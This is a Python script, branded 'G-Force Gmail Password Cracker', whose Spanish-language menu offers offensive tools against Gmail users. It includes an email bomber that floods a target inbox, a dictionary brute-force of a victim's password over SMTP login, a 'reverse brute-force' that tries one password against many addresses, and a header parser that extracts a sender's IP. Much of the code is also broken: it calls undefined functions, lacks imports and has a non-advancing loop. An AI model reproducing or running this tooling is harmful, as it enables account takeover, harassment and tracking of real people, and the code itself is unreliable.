#===== G-Force Gmail Password Cracker
#===== O$int#0800
#===== ZedSquad
#===== https://zedsquad.tk/
#====================================

#<--------------Imports Start & Loading Start-------------->
from colorama import *
from tqdm import tqdm, trange
from time import sleep
import os
import smtplib
import time
import random
import string
from random import randrange, randint
#<--------------Defs-------------->
found = f"{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.LIGHTWHITE_EX}"
wrong = f"{Fore.RED}[{Fore.WHITE}-{Fore.GREEN}] {Fore.LIGHTWHITE_EX}"
#<--------------LeaveMenu // Opt 3-------------------->
def leave():
        clear()
        banner()
        print("")
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} ¡Gracias por usar G-Force Gmail Password Cracker!")
        time.sleep(1)

#<--------------Interrupt-------------------->
def exit():
        banner()
        print('¡Has presionado ctrl + c!')
        time.sleep(1)
        menusalir()
        signal.signal(signal.SIGINT, exit)

#<--------------Clear command-------------------->
def clear():
        if(os.name == "nt"):
                os.system('cls')
        else:
                os.system('clear')
#<--------------Failed-------------------->
def fail():
    print(f"{wrong} Parámeto inválidó. Inténtelo de nuevo.")
    time.sleep(2.5)
    emailbomber()

#<--------------Banner-------------->
def banner():
    print(f"""{Fore.LIGHTYELLOW_EX}
╔═╗       ╔═╗┌─┐┬─┐┌─┐┌─┐
║ ╦  ───  ╠╣ │ │├┬┘│  ├┤ 
╚═╝       ╚  └─┘┴└─└─┘└─┘
                   _     __,..---""-._                 ';-,
            ,    _/_),-"`             '-.                `\\
           \|.-"`    -_)                 '.                ||
           /`   a   ,                      \              .'/
           '.___,__/                 .-'    \_        _.-'.'
              |\  \      \         /`        _`""""""`_.-'
                 _/;--._, >        |   --.__/ `""""""`
               (((-'  __//`'-......-;\      )
                    (((-'       __//  '--. /
                              (((-'    __//
                                     (((-'
    """)
    print(f"{Fore.LIGHTYELLOW_EX}            https:// {Fore.RESET}{Fore.LIGHTRED_EX}n i x s q u a d . {Fore.LIGHTYELLOW_EX}p y /{Fore.RESET}")
#<--------------Email Info // Opt 1-------------->
def emailbomber():
    clear()
    banner()
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} Ingrese el correo emisor: ", end=f"{Fore.RESET}")
    myaddres = input()
    if myaddres=="":
        failed()
    else:
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} Ingrese la contraseña del correo emisor: ", end=f"{Fore.RESET}")
        mypass = input()
        if (mypass==""):
            failed()
        else:
            print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} Ingrese el correo receptor: ", end=f"{Fore.RESET}")
            rec = input()
            if (rec==""):
                failed()
            else:
                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} Escriba el mensaje a enviar: ", end=f"{Fore.RESET}")
                message = input()
                if (message==""):
                    failed()
                else:
                    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} La cantidad de mensajes a enviar: ", end=f"{Fore.RESET}")
                    cant = input()
                    if cant.isdigit():
                        int(cant)
                        try:
                            server = smtplib.SMTP("smtp.gmail.com", 587)
                            server.starttls()
                            server.ehlo()
                            server.login(myaddres, mypass)
                            clear()
                            os.system("@title G-Force - Estableciendo conexión...")
                            banner()
                            os.system(f"title G-Force - Conexión establecida en {rec}...")
                            print(f"{Fore.LIGHTYELLOW_EX}")
                            progressbar = tqdm([2,4,6,8,10])
                            for item in progressbar:
                                sleep(0.1)
                                progressbar.set_description(' Conectando a la cuenta: ')
                                clear()
                                banner()
                                print(f"""

                                                    Connected to {rec}

                                            """)

                                time.sleep(2.5)

                                value = 0
                                while value < cant:
                                    value+=0
                                    server.sendmail(myaddres, rec, message)
                                    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} {value} mensajes enviados al receptor {rec}")
                                print(f"{Fore.RESET}¡Emails enviados con éxito!")
                                print(f"Presione 'enter' para regresar{Fore.RESET}")
                                input()
                                menu()
                        except smtplib.SMTPServerDisconnected:
                                print(f"{wrong} Inicio de sesión en correo emisor inválido. Inténtelo de nuevo.")
                                time.sleep(2.5)
                                emailbomber()
                                
                        except smtplib.SMTPAuthenticationError:
                                print(f"{wrong} Inicio de sesión en correo emisor inválido.")
                                time.sleep(2.5)
                                emailbomber()
                    else:
                        print(f"{wrong} Cantidad de correos a enviar inválida. Inténtelo de nuevo.")
                        time.sleep(2.5)
                        emailbomber()  

#<--------------Email bruteforce // Opt 2-------------->
def mailbruteforce():
    clear()
    os.system("@title G-Force - BruteForce")
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    banner()
    print("")
    email = input(f"{Fore.LIGHTYELLOW_EX} [{Fore.RESET}+{Fore.LIGHTYELLOW_EX}] {Fore.RESET} Ingrese el correo crackear: ", end=f"{Fore.RESET}")

    clear()
    os.system("@title G-Force - Estableciendo conexión...")
    banner()
    time.sleep(2.5)
    os.system(f"title G-Force - Conexión establecida en {email}...")
    print(f"{Fore.LIGHTYELLOW_EX}")
    progressbar = tqdm([2,4,6,8,10])
    for item in progressbar:
        sleep(0.1)
        progressbar.set_description(' Conectando a la cuenta: ')

    clear()
    banner()
    print(f"""

                        Connected to {email}

                """)

    wdfile = input(f"{Fore.RESET} [{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} Ingrese el directorio en donde se encuentra su diccionario:{Fore.RESET} ", end="")

    if (os.path.exists(wdfile)):
        file = open(wdfile, "r")
                        
        for password in file:
            password = password.strip('\n')
            try:
                smtpserver.login(email, password)
                print(f"{found} Contraseña válida: " + password)
                print("")
                input(f" {Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} ¡Listo! Presione enter para volver al menú")
                menu()
                                    
            except smtplib.SMTPServerDisconnected:
                pass

                            
            except KeyboardInterrupt:
                pass

            except smtplib.SMTPAuthenticationError:
                print(f"{wrong} Contraseña inválida: " + password)
                        
        print("")            
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} ¡Listo!")
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}1{Fore.LIGHTYELLOW_EX}]{Fore.RESET} Seguir crackeando")
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}2{Fore.LIGHTYELLOW_EX}]{Fore.RESET} Leave")
        q = input()
        if (q == "1"):
            menu()
        else:
            leave()
    else:
        print(f"{Fore.RED}[{Fore.WHITE}+{Fore.RED}]{Fore.WHITE} No existe tal archivo o directorio. Inténtelo de nuevo.")
        time.sleep(3)
        mailbruteforce()

#<-------------Mail tracker // Opt 3-------------->
def mltracker():
    clear()
    banner()
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Ingrese el directorio en donde se encuentra la cabecera del mail a buscar: ", end=f"{Fore.RESET}")
    ml = input()
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Buscando resultados para {ml}...")
    if os.path.exists(ml):
        ml2 = open(ml, "r")
        msg = email.message_from_file(ml2)
        s = msg["Received-SPF"]
        fin = s.find('client-ip')
        fin2 = s[fin-1:]
        fin3 = fin2.replace("client-ip=", "")
      
        print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Dirección IP encontrada:{Fore.RESET}{fin3}")

        print("")
        print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Búsqueda terminada")
        print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Presione 'enter' para regresar{Fore.RESET}")
        input()
        menu()
    else:
        print("")
        print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}No existe tal archivo o directorio")
        print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Presione 'enter' para regresar{Fore.RESET}")
        input()
        mltracker()
#<-------------Use a mail wordlist // Opt 4.1-------------->
def mlwrdlist():
    clear()
    banner()
    print("")
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Ingrese el directorio en donde se encuentra su diccionario: ", end=f"{Fore.RESET}")
    dic = input()
    if (os.path.exists(dic)):
        print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Ingrese la contraseña a buscar: ", end=f"{Fore.RESET}")
        passw = input()
        arch = open(dic, "r")
        print("")
        for mails in arch:
            mails = mails.strip('\n')
            try:
                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.starttls()
                server.ehlo()
                server.login(mails, passw)
                print(f"{found} Mail válido: " + mails)
                print("")
                input(f" {Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} ¡Listo! Presione enter para volver al menú")
                menu()
            except smtplib.SMTPServerDisconnected:
                pass                   
                    
            except KeyboardInterrupt:
                pass
                    
            except smtplib.SMTPAuthenticationError:
                print(f"{wrong} Correo inválido: " + mails)
                
        print("")            
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} ¡Listo!")
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}1{Fore.LIGHTYELLOW_EX}]{Fore.RESET} Seguir crackeando")
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}2{Fore.LIGHTYELLOW_EX}]{Fore.RESET} Leave")
        q = input()
        if (q == "1"):
            menu()
        else:
            leave()
    else:
        print("")
        print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}No existe tal archivo o directorio")
        print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Presione 'enter' para regresar{Fore.RESET}")
        input()
        mlwrdlist() 
#<-------------Use random mails // Opt 4.2-------------->
def rndmmails():
    clear()
    banner()
    print("")
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Ingres el número de combinaciones a buscar: ", end=f"{Fore.RESET}")
    num = input()
    if (num.isdigit()):
        num0 = int(num)
        if (num0 <= 2):
            print(f"{Fore.RED}[{Fore.WHITE}+{Fore.RED}]{Fore.WHITE} Error de valores, se dieron menos de 2 argumentos. Inténtelo de nuevo.")
            time.sleep(3)
            rndmmails()
        else:
            print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}+{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Ingrese la contraseña a buscar: ", end=f"{Fore.RESET}")
            print("")
            pas = input()
            value = 1
            while value < num0:
                lista = randint(6, 30)
                mailwordgen = ("").join(random.choices(string.ascii_letters + string.digits, k=lista))
                mailwordgen += "@gmail.com"
                try:
                    server = smtplib.SMTP("smtp.gmail.com", 587)
                    server.starttls()
                    server.ehlo()
                    server.login(mailwordgen, pas)
                    print(f"{found} Mail válido: " + mailwordgen)
                    print("")
                    input(f" {Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} ¡Listo! Presione enter para volver al menú")
                    menu()
                except smtplib.SMTPServerDisconnected:
                    pass                   
                
                except KeyboardInterrupt:
                    pass
                
                except smtplib.SMTPAuthenticationError:
                    print(f"{wrong} Correo inválido: " + mailwordgen)
                
                value += 1
            
            print("")            
            print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} ¡Listo!")
            print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}1{Fore.LIGHTYELLOW_EX}]{Fore.RESET} Seguir crackeando")
            print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}2{Fore.LIGHTYELLOW_EX}]{Fore.RESET} Leave")
            q = input()
            if (q == "1"):
                menu()
            else:
                leave()
#<-------------Reverse bruteforce // Opt 4-------------->
def reversebf():
    clear()
    banner()
    print("")
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}1{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Use a mails wordlist")
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}2{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Use random mails")
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}3{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Leave")   
    print("")
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]{Fore.RESET}      Selecciona una opción: ", end=f"{Fore.RESET}")
    rvs = input()
    if rvs=="1":
        mlwrdlist()
    elif rvs=="2":
        rndmmails()
    elif rvs=="3":
        leave()
    else:
        clear()
        banner()
        print("")
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RED}${Fore.LIGHTYELLOW_EX}]{Fore.RESET}      ¡Selecciona un argumento válido!")
        time.sleep(2)
        menu()        



#<--------------Menu-------------->
def menu():
    clear()
    os.system('@title G-Force Gmail Password Cracker by O$int #ZedSquad')
    banner()
    print("")
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]     Dev:{Fore.RESET} O{Fore.LIGHTRED_EX}${Fore.RESET}int <3")
    print("")
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}1{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Email bomber")
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}2{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Gmail Password Cracker")
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}3{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Gmail Reverse BruteForce")
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}4{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Mail tracker")
    print(f"{Fore.LIGHTYELLOW_EX}[{Style.RESET_ALL}5{Fore.LIGHTYELLOW_EX}]      {Fore.RESET}Leave")
    print("")
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]{Fore.RESET}      Selecciona una opción: ", end=f"{Fore.RESET}")
    opt = input()
    if (opt=="1"):
        emailbomber()
    elif (opt=="2"):
        mailbruteforce()
    elif (opt=="3"):
        reversebf()
    elif (opt=="4"):
        mltracker()
    elif (opt=="5"):
        leave()
    else:
        clear()
        banner()
        print("")
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RED}${Fore.LIGHTYELLOW_EX}]{Fore.RESET}      ¡Selecciona un argumento válido!")
        time.sleep(2)
        menu()

#<===========Main=============>
menu()

